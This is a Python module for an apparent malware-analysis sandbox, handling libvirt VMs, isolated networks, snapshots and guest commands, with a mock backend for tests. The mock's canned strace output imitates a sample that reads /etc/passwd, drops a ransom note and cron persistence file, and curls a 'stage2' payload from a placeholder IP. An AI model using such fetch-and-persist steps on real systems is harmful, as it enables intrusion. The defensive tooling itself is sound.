import logging
import asyncio
import os
import subprocess
import json
import base64
import tempfile
import shutil

from yemu.core.vm_backend import VMBackend

try:
    import libvirt
except ImportError:
    libvirt = None

class VMManager(VMBackend):
    """libvirt / QEMU-KVM backend (Linux hosts)."""
    name = "libvirt"

    def __init__(self, ui_callback=None):
        super().__init__(ui_callback=ui_callback)
        self._conn = None
        # Fix for libguestfs kernel access errors
        os.environ["LIBGUESTFS_BACKEND"] = "direct"

    def _get_conn(self):
        if not libvirt:
            raise RuntimeError("libvirt module not found. Please install libvirt-python.")

        if self._conn is not None:
            try:
                if self._conn.isAlive():
                    return self._conn
            except libvirt.libvirtError:
                pass
            self._conn = None

        uris = ['qemu:///system', 'qemu:///session']
        for uri in uris:
            try:
                self.logger.info(f"Attempting to connect to libvirt at {uri}...")
                self._conn = libvirt.open(uri)
                if self._conn is not None:
                    self.logger.info(f"Successfully connected to libvirt using {uri}")
                    return self._conn
            except libvirt.libvirtError as e:
                self.logger.warning(f"Failed to connect to {uri}: {e}")

        raise RuntimeError("Failed to open connection to libvirt (tried system and session)")

    def _get_domain(self, vm_name):
        try:
            conn = self._get_conn()
            return conn.lookupByName(vm_name)
        except libvirt.libvirtError as e:
            if e.get_error_code() == libvirt.VIR_ERR_NO_DOMAIN:
                msg = f"VM '{vm_name}' not found in libvirt. Please create it first using 'Prepare New VM'."
                self.logger.error(msg)
                self._notify_ui(msg, "CRITICAL")
            else:
                msg = f"Libvirt error while looking up domain '{vm_name}': {e}"
                self.logger.error(msg)
                self._notify_ui(msg, "CRITICAL")
            return None

    def list_vms(self):
        try:
            conn = self._get_conn()
            domains = conn.listAllDomains(0)
            return [dom.name() for dom in domains]
        except libvirt.libvirtError as e:
            self.logger.error(f"Failed to list VMs: {e}")
            return []

    def list_snapshots(self, vm_name):
        dom = self._get_domain(vm_name)
        if not dom:
            return []
        try:
            snapshots = dom.listAllSnapshots(0)
            return [snap.getName() for snap in snapshots]
        except libvirt.libvirtError as e:
            self.logger.error(f"Failed to list snapshots for {vm_name}: {e}")
            return []

    def _remove_existing_domain(self, vm_name):
        dom = self._get_domain(vm_name)
        if dom is None:
            return
        self.logger.info(f"Removing existing domain: {vm_name}")
        try:
            if dom.isActive():
                dom.destroy()
        except libvirt.libvirtError:
            pass
        try:
            dom.undefine()
        except libvirt.libvirtError as e:
            self.logger.warning(f"Could not undefine domain: {e}")

    async def ensure_network(self, network_name="malware-analysis", nat=False):
        try:
            conn = self._get_conn()
            net = conn.networkLookupByName(network_name)
            if not net.isActive():
                self.logger.info(f"Network {network_name} is inactive. Starting...")
                net.create()
            return True
        except libvirt.libvirtError as e:
            if e.get_error_code() != libvirt.VIR_ERR_NO_NETWORK:
                self.logger.error(f"Error looking up network {network_name}: {e}")
                return False
            self.logger.info(f"Network {network_name} not found. Creating...")
            # NAT networks are only for provisioning; analysis networks stay isolated
            subnet, bridge = ("192.168.101", "virbr-yemuprov") if nat else ("192.168.100", "virbr-malware")
            forward = "<forward mode='nat'/>" if nat else ""
            xml = f"""
            <network>
              <name>{network_name}</name>
              {forward}
              <bridge name='{bridge}' stp='on' delay='0'/>
              <ip address='{subnet}.1' netmask='255.255.255.0'>
                <dhcp>
                  <range start='{subnet}.10' end='{subnet}.100'/>
                </dhcp>
              </ip>
            </network>
            """
            try:
                net = conn.networkDefineXML(xml)
                net.setAutostart(True)
                net.create()
                return True
            except libvirt.libvirtError as e:
                self.logger.error(f"Failed to create network: {e}")
                return False

    async def create_disk(self, disk_path, size_gb, backing_file=None):
        os.makedirs(os.path.dirname(disk_path), exist_ok=True)
        cmd = ["qemu-img", "create", "-f", "qcow2"]
        if backing_file:
            cmd += ["-b", backing_file, "-F", "qcow2", disk_path, f"{size_gb}G"]
        else:
            cmd += [disk_path, f"{size_gb}G"]

        try:
            process = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            try:
                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=60)
            except (asyncio.TimeoutError, TimeoutError):
                process.kill()
                self.logger.error("qemu-img create timed out")
                return False

            if process.returncode != 0:
                self.logger.error(f"qemu-img failed: {stderr.decode()}")
                stderr_str = stderr.decode()
                if "Permission denied" in stderr_str or "Could not open" in stderr_str:
                    new_path = os.path.join("/var/tmp", os.path.basename(disk_path))
                    self.logger.warning(f"Retrying in /var/tmp as {new_path}...")
                    return await self.create_disk(new_path, size_gb, backing_file)
                return False
            os.chmod(disk_path, 0o644)
            return disk_path
        except Exception as e:
            self.logger.error(f"Disk creation failed: {e}")
            return False

    async def define_vm(self, spec):
        from yemu.core.vm_provisioner import VMProvisioner
        xml = VMProvisioner.render_libvirt_xml(spec)
        conn = self._get_conn()
        self._remove_existing_domain(spec.name)
        try:
            conn.defineXML(xml)
            return True
        except libvirt.libvirtError as e:
            self.logger.error(f"Failed to define VM: {e}")
            return False

    async def switch_network(self, vm_name, from_network, to_network):
        import xml.etree.ElementTree as ET
        dom = self._get_domain(vm_name)
        if not dom:
            return False
        try:
            await self._shutdown_gracefully(dom)
            root = ET.fromstring(dom.XMLDesc(libvirt.VIR_DOMAIN_XML_INACTIVE))
            changed = False
            for src in root.findall("./devices/interface[@type='network']/source"):
                if src.get("network") == from_network:
                    src.set("network", to_network)
                    changed = True
            if changed:
                self._get_conn().defineXML(ET.tostring(root, encoding="unicode"))
            return True
        except (libvirt.libvirtError, ET.ParseError) as e:
            self.logger.error(f"Failed to move {vm_name} to network {to_network}: {e}")
            return False

    async def _shutdown_gracefully(self, dom, timeout=120):
        """ACPI shutdown so freshly written guest data reaches disk; force off after timeout."""
        if not dom.isActive():
            return
        try:
            dom.shutdown()
        except libvirt.libvirtError:
            pass
        for _ in range(timeout // 2):
            if not dom.isActive():
                return
            await asyncio.sleep(2)
        self.logger.warning(f"{dom.name()} did not shut down in {timeout}s, forcing off")
        dom.destroy()

    async def create_snapshot(self, vm_name, snapshot_name="clean-baseline", description="Clean state"):
        dom = self._get_domain(vm_name)
        if not dom:
            return False
        xml = f"""
        <domainsnapshot>
          <name>{snapshot_name}</name>
          <description>{description}</description>
        </domainsnapshot>
        """
        try:
            dom.snapshotCreateXML(xml, 0)
            return True
        except libvirt.libvirtError as e:
            self.logger.error(f"Failed to create snapshot: {e}")
            return False

    async def start_vm(self, vm_name):
        self.logger.info(f"Starting VM: {vm_name}")
        dom = self._get_domain(vm_name)
        if not dom:
            return False
        try:
            if not dom.isActive():
                dom.create()
            return True
        except libvirt.libvirtError as e:
            self.logger.error(f"Failed to start VM: {e}")
            return False

    async def wait_for_guest_agent(self, vm_name, timeout=300):
        self.logger.info(f"Waiting for guest agent on {vm_name} (timeout {timeout}s)...")
        for _ in range(max(1, timeout // 5)):
            try:
                ping_args = {"execute": "guest-ping"}
                # Use the same connection URI for virsh if possible, or just let it use default
                cmd = ["virsh", "qemu-agent-command", vm_name, json.dumps(ping_args)]
                proc = await asyncio.create_subprocess_exec(
                    *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
                )
                try:
                    stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=10)
                except (asyncio.TimeoutError, TimeoutError):
                    proc.kill()
                    continue

                if proc.returncode == 0:
                    self.logger.info(f"Guest agent ready for {vm_name}")
                    return True

                stderr_str = stderr.decode().lower()
                if "not found" in stderr_str or "no such domain" in stderr_str:
                    self.logger.warning(f"VM {vm_name} not found during agent wait.")
                    return False
                if "agent is not configured" in stderr_str or "not supported" in stderr_str:
                    self.logger.warning(f"Guest agent not configured for VM {vm_name}. Degrading gracefully.")
                    return False
            except Exception as e:
                self.logger.debug(f"Guest agent check failed: {e}")

            await asyncio.sleep(5)
        self.logger.warning(f"Guest agent timeout for VM {vm_name}. Proceeding without agent-dependent steps.")
        return False

    async def stop_vm(self, vm_name):
        self.logger.info(f"Stopping VM: {vm_name}")
        dom = self._get_domain(vm_name)
        if not dom:
            return False
        try:
            if dom.isActive():
                dom.destroy()
            return True
        except libvirt.libvirtError as e:
            self.logger.error(f"Failed to stop VM: {e}")
            return False

    async def inject_file(self, vm_name, local_path, guest_path):
        self.logger.info(f"Injecting {local_path} to {vm_name}:{guest_path}")
        target_name = os.path.basename(guest_path)
        remote_dir = os.path.dirname(guest_path)
        with tempfile.TemporaryDirectory() as tmpdir:
            tmp_local_file = os.path.join(tmpdir, target_name)
            shutil.copy2(local_path, tmp_local_file)
            cmd = ["virt-copy-in", "-d", vm_name, tmp_local_file, remote_dir]
            try:
                process = await asyncio.create_subprocess_exec(
                    *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
                )
                try:
                    stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=120)
                except (asyncio.TimeoutError, TimeoutError):
                    process.kill()
                    self.logger.error("virt-copy-in timed out")
                    return False

                if process.returncode != 0:
                    self.logger.error(f"virt-copy-in failed: {stderr.decode()}")
                    return False
                return True
            except Exception as e:
                self.logger.error(f"Injection failed: {e}")
                return False

    async def run_command(self, vm_name, command, shell="/bin/sh"):
        self.logger.info(f"Running command in {vm_name}: {command}")
        try:
            exec_args = {
                "execute": "guest-exec",
                "arguments": {
                    "path": shell,
                    "arg": ["/c" if "cmd" in shell else "-c", command],
                    "capture-output": True
                }
            }
            cmd = ["virsh", "qemu-agent-command", vm_name, json.dumps(exec_args)]
            proc = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            try:
                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
            except (asyncio.TimeoutError, TimeoutError):
                proc.kill()
                self.logger.error(f"virsh qemu-agent-command timed out for: {command}")
                return ""

            if proc.returncode != 0:
                err_msg = stderr.decode()
                if "agent is not configured" in err_msg or "not supported" in err_msg:
                    self.logger.warning(f"Guest agent unavailable for command: {command}")
                else:
                    self.logger.error(f"virsh qemu-agent-command failed: {err_msg}")
                return ""

            try:
                resp = json.loads(stdout.decode())
            except json.JSONDecodeError:
                self.logger.error(f"Failed to decode agent response: {stdout.decode()}")
                return ""

            if 'return' not in resp or 'pid' not in resp['return']:
                self.logger.error(f"Unexpected response: {resp}")
                return ""
            pid = resp['return']['pid']
            status_args = {
                "execute": "guest-exec-status",
                "arguments": {"pid": pid}
            }
            for _ in range(60):
                await asyncio.sleep(1)
                cmd = ["virsh", "qemu-agent-command", vm_name, json.dumps(status_args)]
                proc = await asyncio.create_subprocess_exec(
                    *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
                )
                try:
                    stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
                except (asyncio.TimeoutError, TimeoutError):
                    proc.kill()
                    continue

                try:
                    status_resp = json.loads(stdout.decode())
                except json.JSONDecodeError:
                    continue

                if 'return' in status_resp and status_resp['return']['exited']:
                    out_b64 = status_resp['return'].get('out-data', '')
                    return base64.b64decode(out_b64).decode(errors='replace')
            self.logger.warning(f"Command '{command}' timed out in guest.")
            return "TIMEOUT"
        except Exception as e:
            self.logger.error(f"run_command failed: {e}")
            return ""

    async def vm_state(self, vm_name):
        dom = self._get_domain(vm_name)
        if not dom:
            return "unknown"
        try:
            return "running" if dom.isActive() else "stopped"
        except libvirt.libvirtError:
            return "unknown"

    async def verify_environment(self, vm_name):
        try:
            conn = self._get_conn()
            if not conn.isAlive():
                return False, "Libvirt connection is not alive"
            dom = self._get_domain(vm_name)
            if not dom:
                return False, f"VM {vm_name} not found"
            return True, "OK"
        except Exception as e:
            return False, str(e)

    async def find_internet_facing_networks(self, vm_name):
        """Return names of libvirt networks attached to vm_name that forward traffic off-host."""
        import xml.etree.ElementTree as ET
        dom = self._get_domain(vm_name)
        if not dom:
            return []
        exposed = []
        try:
            conn = self._get_conn()
            root = ET.fromstring(dom.XMLDesc(0))
            for src in root.findall("./devices/interface[@type='network']/source"):
                net_name = src.get("network")
                if not net_name:
                    continue
                net_root = ET.fromstring(conn.networkLookupByName(net_name).XMLDesc(0))
                if net_root.find("forward") is not None:
                    exposed.append(net_name)
            # bridge/direct interfaces put the guest straight on a host network
            for iface in root.findall("./devices/interface"):
                if iface.get("type") in ("bridge", "direct"):
                    exposed.append(f"{iface.get('type')} interface")
        except (libvirt.libvirtError, ET.ParseError) as e:
            self.logger.warning(f"Could not inspect networks for {vm_name}: {e}")
        return exposed

    async def revert_to_snapshot(self, vm_name, snapshot_name="clean-baseline"):
        dom = self._get_domain(vm_name)
        if not dom:
            raise RuntimeError(f"VM {vm_name} not found")
        try:
            snap = dom.snapshotLookupByName(snapshot_name)
            dom.revertToSnapshot(snap)
            return True
        except libvirt.libvirtError as e:
            self.logger.error(f"Failed to revert to snapshot {snapshot_name}: {e}")
            raise RuntimeError(f"Failed to revert to snapshot: {e}")

    async def open_gui(self, vm_name):
        self.logger.info(f"Opening GUI for {vm_name}")
        try:
            # Try to determine URI from current connection or default
            uri = "qemu:///system"
            if self._conn:
                try:
                    uri = self._conn.getURI()
                except libvirt.libvirtError:
                    pass
            subprocess.Popen(["virt-viewer", "-c", uri, "--attach", vm_name])
            return True
        except Exception as e:
            msg = f"Failed to open GUI: {e}"
            self.logger.error(msg)
            self._notify_ui(msg, "CRITICAL")
            return False

    async def inject_file_via_agent(self, vm_name, local_path, guest_path):
        self.logger.info(f"Injecting {local_path} to {vm_name}:{guest_path} via guest agent")
        chunk_size = 48 * 1024

        try:
            # 1. Open file
            open_args = {
                "execute": "guest-file-open",
                "arguments": {"path": guest_path, "mode": "wb"}
            }
            cmd = ["virsh", "qemu-agent-command", vm_name, json.dumps(open_args)]
            proc = await asyncio.create_subprocess_exec(*cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            stdout, stderr = await proc.communicate()
            if proc.returncode != 0:
                self.logger.error(f"guest-file-open failed: {stderr.decode()}")
                return False

            handle = json.loads(stdout.decode())['return']

            # 2. Write content in chunks without loading whole file into memory
            with open(local_path, "rb") as f:
                while True:
                    chunk = f.read(chunk_size)
                    if not chunk:
                        break
                    write_args = {
                        "execute": "guest-file-write",
                        "arguments": {
                            "handle": handle,
                            "buf-b64": base64.b64encode(chunk).decode()
                        }
                    }
                    cmd = ["virsh", "qemu-agent-command", vm_name, json.dumps(write_args)]
                    proc = await asyncio.create_subprocess_exec(*cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                    stdout, stderr = await proc.communicate()
                    if proc.returncode != 0:
                        self.logger.error(f"guest-file-write failed: {stderr.decode()}")
                        return False

            # 3. Close file
            close_args = {
                "execute": "guest-file-close",
                "arguments": {"handle": handle}
            }
            cmd = ["virsh", "qemu-agent-command", vm_name, json.dumps(close_args)]
            await asyncio.create_subprocess_exec(*cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)

            return True
        except Exception as e:
            self.logger.error(f"inject_file_via_agent failed: {e}")
            return False

    async def pull_file(self, vm_name, guest_path, local_path):
        self.logger.info(f"Pulling {vm_name}:{guest_path} to {local_path}")
        cmd = ["virt-copy-out", "-d", vm_name, guest_path, os.path.dirname(local_path)]
        try:
            process = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            try:
                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=120)
            except (asyncio.TimeoutError, TimeoutError):
                process.kill()
                self.logger.error("virt-copy-out timed out")
                return False

            if process.returncode != 0:
                self.logger.error(f"virt-copy-out failed: {stderr.decode()}")
                return False

            # virt-copy-out copies to the directory, we might need to rename if local_path is different
            filename = os.path.basename(guest_path)
            downloaded_path = os.path.join(os.path.dirname(local_path), filename)
            if downloaded_path != local_path:
                os.rename(downloaded_path, local_path)
            return True
        except Exception as e:
            self.logger.error(f"Pull failed: {e}")
            return False

class MockVMManager(VMBackend):
    """Canned responses so the UI, CLI and tests run without virtualization."""
    name = "mock"

    def list_vms(self):
        return ["mock-ubuntu", "mock-windows"]

    def list_snapshots(self, vm_name):
        return ["clean-baseline", "infected-state"]

    async def ensure_network(self, network_name="malware-analysis", nat=False):
        return True

    async def switch_network(self, vm_name, from_network, to_network):
        return True

    async def create_disk(self, disk_path, size_gb, backing_file=None):
        return disk_path

    async def define_vm(self, spec):
        return True

    async def create_snapshot(self, vm_name, snapshot_name="clean-baseline", description="Clean state"):
        return True

    async def start_vm(self, vm_name):
        return True

    async def wait_for_guest_agent(self, vm_name, timeout=300):
        return True

    async def stop_vm(self, vm_name):
        return True

    async def inject_file(self, vm_name, local_path, guest_path):
        return True

    MOCK_STRACE = {
        "strace.1234": [
            '10:00:00.000100 execve("/malware_sample", ["/malware_sample"], 0x7ffd0 /* 9 vars */) = 0',
            '10:00:00.000400 openat(AT_FDCWD, "/etc/passwd", O_RDONLY|O_CLOEXEC) = 3',
            '10:00:00.000900 openat(AT_FDCWD, "/tmp/DECRYPT_FILES.txt", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 4',
            '10:00:00.001100 openat(AT_FDCWD, "/etc/cron.d/updater", O_WRONLY|O_CREAT|O_TRUNC, 0644) = 5',
            '10:00:00.001200 vfork() = 1240',
            '10:00:00.003000 connect(5, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("203.0.113.10")}, 16) = -1 ENETUNREACH',
        ],
        "strace.1240": [
            '10:00:00.001300 execve("/usr/bin/curl", ["curl", "-s", "http://203.0.113.10/stage2"], 0x7ffd1 /* 9 vars */) = 0',
            '10:00:00.001800 connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("203.0.113.10")}, 16) = -1 ENETUNREACH',
        ],
    }

    # an empty but valid pcap (global header only)
    EMPTY_PCAP = bytes.fromhex("d4c3b2a1020004000000000000000000ffff000001000000")

    async def run_command(self, vm_name, command, shell="/bin/sh"):
        import shlex
        if command.startswith("ls -1 "):
            return "\n".join(["rules.yarc", "sample", *self.MOCK_STRACE])
        if command.startswith("cat ") and "/strace." in command:
            name = shlex.split(command)[1].rsplit("/", 1)[-1]
            return "\n".join(self.MOCK_STRACE.get(name, []))
        if command.startswith("stat -c %s"):
            return str(len(self.EMPTY_PCAP))
        if command == "command -v yara":
            return "/usr/bin/yara"
        if "strace" in command:
            return "execve('/bin/ls', ['ls'], 0x7ffd989c8d30) = 0\nopenat(AT_FDCWD, '.', O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 3"
        if "yara -C" in command:
            pid = command.rsplit(" ", 2)[-2] if command.endswith("2>/dev/null") else command.split()[-1]
            if pid == "1234":
                return ('suspicious_process [description="Matched a suspicious pattern in memory",author="YEMU"] 1234\n'
                        '0x10000:$s1: 58 50 45 4e 44 41 54 41\n0x10500:$s2: malicious_function_name')
            return ""
        if "yara" in command and "/proc" in command:
            return """
suspicious_process [malware,stealer] /proc/1234/mem
description: "Matched a suspicious pattern in memory"
author: "YEMU"
0x10000:$s1: 58 50 45 4e 44 41 54 41
0x10500:$s2: malicious_function_name

packer_match [packer] /proc/5678/mem
0x20000:$p1: UPX!
"""
        if "cat /proc/1234/comm" in command: return "suspicious.elf"
        if "readlink -f /proc/1234/exe" in command: return "/tmp/suspicious.elf"
        if "cat /proc/1234/cmdline" in command: return "/tmp/suspicious.elf --payload"

        if "cat /proc/5678/comm" in command: return "loader"
        if "readlink -f /proc/5678/exe" in command: return "/usr/bin/loader"
        if "cat /proc/5678/cmdline" in command: return "/usr/bin/loader -d"

        return "mock output"

    async def verify_environment(self, vm_name):
        return True, "OK"

    async def vm_state(self, vm_name):
        return "stopped"

    async def find_internet_facing_networks(self, vm_name):
        return []

    async def revert_to_snapshot(self, vm_name, snapshot_name="clean-baseline"):
        return True

    async def open_gui(self, vm_name):
        self.logger.info(f"Mock: Opening GUI for {vm_name}")
        return True

    async def pull_file(self, vm_name, guest_path, local_path):
        if guest_path.endswith(".pcap"):
            with open(local_path, "wb") as f:
                f.write(self.EMPTY_PCAP)
        return True


# Names used by the backend registry
LibvirtBackend = VMManager
MockBackend = MockVMManager
